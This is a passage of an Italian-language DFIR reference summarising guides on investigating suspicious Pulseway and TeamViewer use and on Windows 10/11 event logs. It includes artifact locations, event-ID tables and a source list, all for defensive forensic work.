**Rete:** un sottodominio per account basato sul dominio dell'email di registrazione (es. `reynholmenterprises.pulseway.com`) e i server di accesso remoto `rd-<regione>.pulseway.com/remote` (Stati Uniti est e ovest, Irlanda, Germania, Australia, Sudafrica).

**Le quattro domande:** l'organizzazione lo usa? È previsto su questo endpoint? Quali comandi sono stati eseguiti (evento 24001 più CommandAudit tramite GUID)? L'attività è attesa (data di installazione dalla cartella dati, utenti, connessioni, timeline prima e dopo, trasferimenti di file, altri strumenti di trasferimento)?

Cyber Triage segnala Pulseway come sospetto e ne raccoglie i log; con regole Sigma personalizzate si possono già dare punteggi agli eventi.

*Fonte:* [DFIR Next Steps: Suspicious Pulseway Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-pulseway-use/), Cyber Triage (Mike Wilkinson), 9 ottobre 2025, aggiornata 10 giugno 2026.

### 5.5 TeamViewer

TeamViewer è normale in molti ambienti, quindi la sua presenza non basta: bisogna verificare con IT o MSP e poi leggere i suoi file di connessione, che danno ID del partner, orari in UTC, utente e tipo di sessione.

- **Uso da parte degli attaccanti:** distribuire ransomware, eseguire codice, muoversi lateralmente, restare nel sistema, esfiltrare dati. Casi documentati: ransomware, cryptominer XMRig, toolkit Evilnum, Ursnif.

**Prossimi passi**

- **Confermare:** chiedere a IT o all'MSP se deve esserci; se sì, controllare nei log che utenti e provenienze siano quelli attesi.
- **Guardare indietro:** se è normale nell'ambiente, capire come l'attaccante ha ottenuto credenziali o codici di accesso. Se non lo è, l'attaccante aveva già un altro accesso (altri strumenti remoti o un C2): cercarlo, capire come TeamViewer è stato scaricato (traffico verso `download.teamviewer.com`), confrontare con la timeline le date dell'eseguibile, delle cartelle e del primo avvio.
- **Guardare avanti:** quando è stato avviato l'ultima volta? Era in esecuzione al momento della raccolta? Cosa dicono i log di accesso? Annotare gli intervalli di connessioni e trasferimenti e confrontarli con la timeline del sistema.

| Versione | Caratteristica |
| --- | --- |
| Full Client | Installato; entrambe le parti interagiscono per avviare la connessione |
| Host | Accesso non presidiato: l'utente locale non deve approvare |
| QuickSupport | Sessione singola, senza diritti di amministratore, con un codice; meno comoda per un attaccante |
| Web App | Avvio delle connessioni dal browser (`web.teamviewer.com`) |

**Eseguibili:** `TeamViewer.exe` (interfaccia e connessioni; avvia `tv_w32.exe` e `tv_x64.exe`, e `TeamViewer_Desktop.exe` quando la connessione riesce), `TeamViewer_Service.exe` (servizio), `TeamViewerQS.exe` e `TeamViewerQS_x64.exe` (QuickSupport: scarica i file in `%TEMP%\TeamViewer` senza diritti di amministratore), `TeamViewer_Setup.exe` e `TeamViewer_Setup_x64.exe` (installazione completa, richiede diritti di amministratore). CompanyName nell'intestazione PE: «TeamViewer Germany GmbH».

| File | Posizione | Contenuto |
| --- | --- | --- |
| `TeamViewer*_Logfile*.log` | Portabile: `%LOCALAPPDATA%\TeamViewer\Logs`; installato: `%ProgramFiles%\TeamViewer` | Log di debug (1 MB, poi rinominato `_old`): ID del partner, router TeamViewer (es. `us-njc-anx-r003.router.teamviewer.com`, porta 5938), UUID della sessione, «punch received» con l'IP remoto (privato se in LAN, altrimenti pubblico), uscita dalla sessione |
| `Connections.txt` | `%AppData%\TeamViewer` | Connessioni in uscita riuscite: ID del partner, inizio e fine in UTC (formato GG-MM-AAAA), utente Windows, tipo (RemoteControl, Filetransfer, RemoteTerminal), GUID della sessione |
| `Connections_incoming.txt` | Portabile: `%TEMP%\TeamViewer`; installato: `%ProgramFiles%\TeamViewer` | Connessioni in entrata riuscite: ID del partner, nome visualizzato (poco affidabile, può cambiare), inizio e fine in UTC, utente, tipo, GUID |

**Cartelle:** `%TEMP%\TeamViewer`, `%LOCALAPPDATA%\TeamViewer` (installazione della versione portabile o QuickSupport, creata al primo avvio), `%AppData%\TeamViewer`, `%ProgramFiles%\TeamViewer`, `%ProgramFiles(x86)%\TeamViewer`.

**Domini:** `router.teamviewer.com` (TeamViewer usato sull'endpoint), `web.teamviewer.com` (web app), `download.teamviewer.com` (download).

*Fonte:* [DFIR Next Steps: Suspicious TeamViewer Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-teamviewer-use/), Cyber Triage (Chris Ray), 14 agosto 2025, aggiornata 12 gennaio 2026.

## 6. Event log

### 6.1 Event log di Windows 10 e 11

Gli event log sono la cronologia principale di autenticazioni, servizi e processi, ma ruotano in fretta e possono essere cancellati: vanno affiancati da archivi, copie shadow e raccolte centralizzate.

**Dove e come**

- File `.evtx` (XML in un formato binario a blocchi, che sostituisce il `.evt` di XP e Server 2003) in `C:\Windows\System32\winevt\Logs`. Log principali: Security, System, Application, Setup, ForwardedEvents.
- Configurazione del servizio in `HKLM\SYSTEM\CurrentControlSet\Services\EventLog`: serve anche a scoprire se qualcuno ha spostato i log altrove.
- La struttura a blocchi aiuta a capire se un file è corrotto, manomesso o se il servizio si è fermato male. I file vanno letti con strumenti dedicati: una ricerca di stringhe sul file grezzo è incompleta.
- Orari: Windows registra in UTC, i visualizzatori mostrano l'ora locale. Verificare il fuso in `HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation` e normalizzare tutto, soprattutto quando si confrontano più host.

**Conservazione**

- Dimensione tipica 20 MB per log (Security più grande su server e domain controller). A log pieno: sovrascrittura circolare oppure archiviazione.
- Con l'archiviazione Windows crea `Archive-<Log>-AAAA-MM-GG-hh-mm-ss-nnn.evtx` nella stessa cartella (es. `Archive-Security-2023-10-14-08-30-00-000.evtx`): questi file colmano i buchi di un `Security.evtx` che su un server trafficato copre poche ore. La loro assenza indica cattiva configurazione o anti-forensics.
- Windows Event Forwarding, SIEM ed EDR conservano copie centralizzate: chiederle subito, perché i log locali sono necessari ma non sufficienti.

**Cancellazione dei log:** con le interfacce standard si svuota un log intero, non singoli eventi. Resta l'evento **1102** nel nuovo Security e il **104** nel System per gli altri log. Serve il diritto «Manage auditing and security log» (amministratori e SYSTEM, oppure delegato): fuori dalle finestre di manutenzione è un segnale forte. Le copie shadow possono contenere il `Security.evtx` di prima della cancellazione; unendo più copie conviene deduplicare gli eventi.

**Eventi ad alto valore**

| Area | Log | ID | Significato |
| --- | --- | --- | --- |
| Autenticazione | Security | 4624, 4625, 4648 | Logon riuscito, fallito, con credenziali esplicite; campo Logon Type: 2 console, 3 rete, 10 RDP |
| Autenticazione | Security | 4672 | Privilegi speciali (es. SeDebugPrivilege) assegnati al logon; normale per alcuni account di servizio |
| RDP | TerminalServices-LocalSessionManager/Operational | 21, 22, 24, 25 | Logon, avvio della shell, disconnessione, riconnessione (spesso con l'indirizzo di origine) |
| Servizi | System e Security | 7045 e 4697, 7040, 7034 | Servizio installato, tipo di avvio modificato, servizio terminato in modo imprevisto |
| Processi | Security | 4688 | Processo creato, con processo padre e, se attivato, riga di comando |
| Alimentazione | System | 12, 1074, 506, 507 | Avvio del sistema, spegnimento richiesto dall'utente, ingresso e uscita dal Modern Standby |
| USB | Storage-ClassPnP/Operational, DriverFrameworks-UserMode/Operational | 10000–10002, 507, 512 | Inizializzazione del driver e stato del volume |

Per il 4688 servono «Audit Process Creation» e «Include command line in process creation events». Gli eventi di servizi e USB vanno confrontati con le chiavi di registro corrispondenti.

**Da ignorare o filtrare**

- ID precedenti a Vista, che si trovano ancora nella letteratura vecchia: 528 e 540 (oggi 4624); da 529 a 537 e 539 (oggi 4625); 538 (oggi 4634 e 4647).
- Molto rumorosi: 5156 e 5158 (Windows Filtering Platform), 4662 (accesso a oggetti di directory), 4770 (rinnovo dei ticket Kerberos). Di solito si filtrano, ma servono nelle indagini mirate su Active Directory o Kerberos.

**Metodo:** triage sul sistema acceso con strumenti di raccolta mirata, anche sulle copie shadow, invece di spegnere e copiare dischi interi. Gli strumenti accelerano e ordinano il lavoro, ma l'interpretazione resta dell'analista.

*Fonte:* [Forensic Analysis of Windows 10 and 11 Event Logs](https://blog.elcomsoft.com/2026/02/forensic-analysis-of-windows-10-and-11-event-logs/), ElcomSoft (Oleg Afonin), 18 febbraio 2026.

## Appendice A — Confronto rapido degli artefatti di esecuzione

Nessuno di questi artefatti copre da solo tutte le esecuzioni: la tabella riassume, dalle schede precedenti, che cosa aggiunge ciascuno.

| Artefatto | Cosa prova | Utente | Orari | Limite principale |
| --- | --- | --- | --- | --- |
| Prefetch (1.1) | Esecuzione e file aperti all'avvio | No | Ultime 8 esecuzioni + contatore | Spento sui server; al massimo 1024 file |
| ShimCache (1.2) | Esistenza; esecuzione solo in alcuni casi | No | Solo la data di modifica del file | Scritto allo spegnimento; da Windows 10 non prova l'esecuzione |
| AmCache (1.2) | Esistenza, SHA1, installazioni | No | Nessun orario di esecuzione | Da non usare come prova di esecuzione |
| BAM/DAM (1.3) | Esecuzione | Sì (SID) | Ultima esecuzione | Circa 7 giorni; niente USB né rete |
| RunMRU (1.9) | Comando digitato in Esegui | Sì | Solo per l'ultimo comando | 26 voci; solo la finestra Esegui |
| UserAssist (1.10) | Avvio dalla GUI | Sì (sessione) | Ultima esecuzione + contatore | Voci false da «Apri percorso file» |
| MUICache (1.11) | Finestra mostrata da un eseguibile | Sì (sessione) | Nessuno | Solo programmi con GUI; niente script |
| Jump Lists (1.12) | Accesso a un file tramite un'applicazione | Sì | Ultimo accesso (Automatic Destinations) | Dipende da come l'applicazione le usa |
| Evento 4688 (6.1) | Creazione del processo, con riga di comando | Sì | Ogni esecuzione | Audit spento di default; log che ruotano |

## Appendice B — Event ID citati nelle guide

Gli stessi eventi ritornano in più schede: qui sono raccolti per log, con il rimando alle schede che li spiegano.

| Log | ID | Significato | Schede |
| --- | --- | --- | --- |
| Security | 1102 | Log Security cancellato | 6.1 |
| Security | 4624, 4625 | Logon riuscito, fallito (tipo 2 console, 3 rete, 10 RDP) | 3.4, 5.2, 6.1 |
| Security | 4648 | Logon con credenziali esplicite | 3.2, 6.1 |
| Security | 4672 | Privilegi speciali assegnati al logon | 6.1 |
| Security | 4688 | Processo creato (con riga di comando, se attivata) | 1.4, 1.6, 1.7, 3.3, 5.3, 6.1 |
| Security | 4697 | Servizio installato | 1.7, 6.1 |
| Security | 4698, 4702, 4699 | Attività pianificata creata, aggiornata, cancellata | 1.6, 2.4 |
| Security | 5145 | Accesso dettagliato a una condivisione di rete | 1.6, 1.7 |
| System | 7045 | Servizio installato | 1.7, 5.2, 6.1 |
| System | 7009 | Timeout del servizio (binario che non risponde al Service Control Manager) | 1.7 |
| System | 7040, 7034 | Tipo di avvio modificato, servizio terminato in modo imprevisto | 6.1 |
| System | 104 | Log diverso da Security cancellato | 6.1 |
| System | 12, 1074, 506, 507 | Avvio, spegnimento richiesto dall'utente, ingresso e uscita dal Modern Standby | 6.1 |
| TaskScheduler/Operational | 106, 129, 100, 200, 141 | Attività registrata, processo creato, attività avviata, azione avviata, registrazione cancellata | 1.6, 2.4 |
| TerminalServices-LocalSessionManager/Operational | 21, 22, 24, 25 | Logon, avvio della shell, disconnessione, riconnessione | 6.1 |
| Windows Defender/Operational | 1116 | Malware rilevato (es. download bloccato) | 1.4 |
| Application (MsiInstaller) | 1040, 1042, 1033 | Inizio e fine dell'installazione MSI, esito | 5.2 |
| Application (LogMeIn) | 102, 105, 104, 202, 205 | Logon, logoff, logon fallito, inizio e fine della sessione remota | 5.2 |
| Application (Pulseway) | 24001 | Tutte le richieste ricevute da Pulseway | 5.4 |
| Storage-ClassPnP e DriverFrameworks-UserMode | 10000–10002, 507, 512 | Dispositivi USB: driver e stato del volume | 6.1 |

## Fonti

Post di partenza: [Windows Artifact Forensics Guides – The Master List](https://www.linkedin.com/posts/cyber-triage_windows-artifact-forensics-guides-the-master-activity-7503822145521635328-H3iC), Cyber Triage su LinkedIn, 10 settembre 2026. Le voci che rimandano a Cyber Triage (24 link, perché ShimCache e AmCache coincidono) sono abbinate per titolo alle guide del loro sito, dato che i link abbreviati lnkd.in del post non si aprono in automatico; le 7 voci esterne corrispondono ai link del post.

| Sezione | Voce del post | Articolo | Autore e data |
| --- | --- | --- | --- |
| Esecuzione | Prefetch | [Artifacts of Execution: Prefetch – Part One](https://www.thedfirspot.com/post/artifacts-of-execution-i-know-what-you-did-last-incident) | The DFIR Spot (thatdfirdude), 09/10/2023 |
| Esecuzione | Shimcache, AmCache | [ShimCache and AmCache Forensic Analysis 2026](https://www.cybertriage.com/blog/shimcache-and-amcache-forensic-analysis-2026/) | Cyber Triage (Chris Ray), 02/05/2025 |
| Esecuzione | BAM/DAM | [Forensic Windows Part 5: Analyzing BAM and DAM](https://www.it-connect.tech/forensic-windows-part-5-analyzing-bam-and-dam/) | IT-Connect (Mehdi Dakhama), 17/07/2026 |
| Esecuzione | Certutil.exe | [DFIR Next Steps: Suspicious Use of Certutil.exe](https://www.cybertriage.com/dfir-next-steps/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-certutil-exe/) e [DFIR Breakdown: Using Certutil to Download Attack Tools](https://www.cybertriage.com/blog/dfir-breakdown-using-certutil-to-download-attack-tools/) | Cyber Triage (Mike Wilkinson, 07/08/2024; Chris Ray, 24/07/2024) |
| Esecuzione | Curl.exe | [DFIR Next Steps: Suspicious Use of Curl.exe](https://www.cybertriage.com/blog/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-curl-exe/) | Cyber Triage (Mike Wilkinson), 19/08/2024 |
| Esecuzione | Atexec | [DFIR Breakdown: Impacket Remote Execution Activity – Atexec](https://www.cybertriage.com/blog/dfir-breakdown-impacket-remote-execution-activity-atexec/) | Cyber Triage (Chris Ray), 29/08/2024 |
| Esecuzione | Smbexec | [DFIR Breakdown: Impacket Remote Execution Activity – Smbexec](https://www.cybertriage.com/blog/dfir-breakdown-impacket-remote-execution-activity-smbexec/) | Cyber Triage (Chris Ray), 20/09/2024 |
| Esecuzione | Shellbags | [Shellbags Forensic Analysis 2026](https://www.cybertriage.com/blog/shellbags-forensic-analysis-2026/) | Cyber Triage (Chris Ray), 21/03/2025 |
| Esecuzione | RunMRU | [How to Investigate RunMRU 2026](https://www.cybertriage.com/blog/how-to-investigate-runmru-2026/) | Cyber Triage (Chris Ray), 09/03/2025 |
| Esecuzione | UserAssist | [UserAssist Forensics 2026](https://www.cybertriage.com/blog/userassist-forensics-2026/) | Cyber Triage (Chris Ray), 09/04/2025 |
| Esecuzione | MUICache | [MUICache: 2026 Guide for IT and Investigators](https://www.cybertriage.com/blog/muicache-2026-guide/) | Cyber Triage (Chris Ray), 28/02/2025 |
| Esecuzione | Jump Lists | [Jump Lists Forensics 2025](https://www.cybertriage.com/blog/jump-list-forensics-2025/) e [What Is a Jump List?](https://www.cybertriage.com/blog/what-is-a-jump-list/) | Cyber Triage (Alex Detmering), 14/01/2025 e 29/01/2025 |
| Esecuzione | Jump List Cache | [What Is Jump List Cache?](https://www.cybertriage.com/blog/what-is-jump-list-cache/) | Cyber Triage (Alex Detmering), 24/01/2025 |
| Registro | Registry Forensics | [Windows Registry Forensics 2026](https://www.cybertriage.com/blog/windows-registry-forensics-2026/) | Cyber Triage (Macy Werner), 03/07/2025 |
| Registro | Network Data | [How to Find Evidence of Network Windows Registry](https://www.cybertriage.com/blog/how-to-find-evidence-of-network-windows-registry/) | Cyber Triage (Chris Ray), 18/04/2025 |
| Registro | NTUSER.DAT | [NTUSER.DAT Forensics Analysis 2026](https://www.cybertriage.com/blog/ntuser-dat-forensics-analysis-2026/) | Cyber Triage (Chris Ray), 19/06/2025 |
| Registro | Scheduled Tasks | [Windows Scheduled Tasks for DFIR Investigations](https://www.cybertriage.com/blog/windows-scheduled-tasks-for-dfir-investigations/) | Cyber Triage (Chris Ray, Aaron Bacon), 28/02/2024 |
| Utente | User Identification | [Intro to IR Triage (Part 3): User Enumeration](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-3-user-enumeration/) | Cyber Triage (Brian Carrier), 19/06/2019 |
| Utente | User Logins | [Intro to IR Triage (Part 4): User Logins](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-4-user-logins/) | Cyber Triage (Brian Carrier), 29/07/2019 |
| Utente | User Activity | [Intro to IR Triage (Part 5): User Activity](https://www.cybertriage.com/blog/training/intro-to-ir-triage-part-5-user-activity/) | Cyber Triage (Brian Carrier), 06/08/2019 |
| Utente | Network Logons | [DFIR Next Steps: Suspicious Windows Network Logon Session](https://www.cybertriage.com/dfir-next-steps/dfir-next-steps-what-to-do-after-you-find-a-suspicious-windows-network-logon-session/) | Cyber Triage (Brian Carrier), 15/03/2024 |
| Utente | Browser Artifacts | [Web Browser Forensics: Cookies, Cache, History and Session Recovery](https://forensicspot.com/topics/digital-forensics/web-browser-forensics-cookies-cache-history-sessions) | ForensicSpot (Sourabh), 18/05/2026 |
| File system | `$MFT`/NTFS metadata | [Parsing the `$MFT` NTFS metadata file](https://osdfir.blogspot.com/2020/04/parsing-mft-ntfs-metadata-file.html) | Open Source DFIR (Joachim Metz), 30/04/2020 |
| File system | Volume Shadow Copies | [Volume Shadow Copies: The Hidden Evidence Goldmine](https://medium.com/@cyberengage.org/volume-shadow-copies-the-hidden-evidence-goldmine-you-need-to-know-about-f97ee917e78f) | CyberEngage (Dean), 23/03/2024 |
| File system | Recycle Bin | [Windows Recycle Bin Forensics: `$I`/`$R` Files and Deleted File Metadata](https://sethenoka.com/windows-recycle-bin-forensics-on-windows-10-and-11/) | Seth Enoka, data non indicata |
| RMM | RMM overview | [DFIR Next Steps: Suspicious Use of Remote Monitoring and Management Tools](https://www.cybertriage.com/blog/dfir-next-steps-what-to-do-after-you-find-a-suspicious-use-of-remote-monitoring-management-tools/) | Cyber Triage (Mike Wilkinson), 09/09/2024 |
| RMM | LogMeIn | [DFIR Next Steps: Suspicious LogMeIn Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-logmein-use/) | Cyber Triage (Chris Ray), 03/09/2025 |
| RMM | AnyDesk | [DFIR Next Steps: Suspicious AnyDesk Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-anydesk-use/) | Cyber Triage (Chris Ray), 18/09/2025 |
| RMM | Pulseway | [DFIR Next Steps: Suspicious Pulseway Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-pulseway-use/) | Cyber Triage (Mike Wilkinson), 09/10/2025 |
| RMM | TeamViewer | [DFIR Next Steps: Suspicious TeamViewer Use](https://www.cybertriage.com/blog/dfir-next-steps-suspicious-teamviewer-use/) | Cyber Triage (Chris Ray), 14/08/2025 |
| Event log | Windows Event Logs | [Forensic Analysis of Windows 10 and 11 Event Logs](https://blog.elcomsoft.com/2026/02/forensic-analysis-of-windows-10-and-11-event-logs/) | ElcomSoft (Oleg Afonin), 18/02/2026 |

Fonti integrative, usate solo nelle note segnalate come tali: [SANS Internet Storm Center, Forensic Value of Prefetch](https://isc.sans.edu/diary/29168) e [Forensafe, Windows Background Activity Moderator (BAM)](https://forensafe.com/blogs/bam.html).
